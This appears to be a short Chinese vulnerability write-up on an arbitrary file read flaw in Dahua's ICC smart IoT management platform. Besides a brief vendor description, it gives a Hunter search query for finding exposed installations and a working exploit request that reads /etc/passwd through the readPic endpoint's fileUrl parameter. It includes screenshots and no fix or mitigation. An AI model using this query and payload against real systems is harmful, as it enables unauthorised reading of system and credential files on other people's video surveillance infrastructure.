# 大华智能物联综合管理平台(ICC)存在任意文件读取漏洞

# 一、漏洞简介
浙江大华技术股份有限公司，是全球领先的以视频为核心的智慧物联解决方案提供商和运营服务商，大华智能物联综合管理平台(ICC)存在任意文件读取漏洞。

# 二、影响版本
+ 大华智能物联综合管理平台(ICC)

# 三、资产测绘
+ hunter`web.body="*客户端会小于800*"`
+ 特征

![1698336070869-d2bec4ae-041a-43a9-981b-f3b9dad9c004.png](./img/baFCS1-k5qnJaLlX/1698336070869-d2bec4ae-041a-43a9-981b-f3b9dad9c004-063468.png)

# 四、漏洞复现
```plain
/evo-apigw/evo-cirs/file/readPic?fileUrl=file:/etc/passwd
```

![1698767562703-2a52b16a-1317-44d7-8bb9-531c2f8dfe2f.png](./img/baFCS1-k5qnJaLlX/1698767562703-2a52b16a-1317-44d7-8bb9-531c2f8dfe2f-099139.png)



> 更新: 2024-02-29 23:57:19  
> 原文: <https://www.yuque.com/xiaokp7/ocvun2/dh0fr3iwsw1u74kk>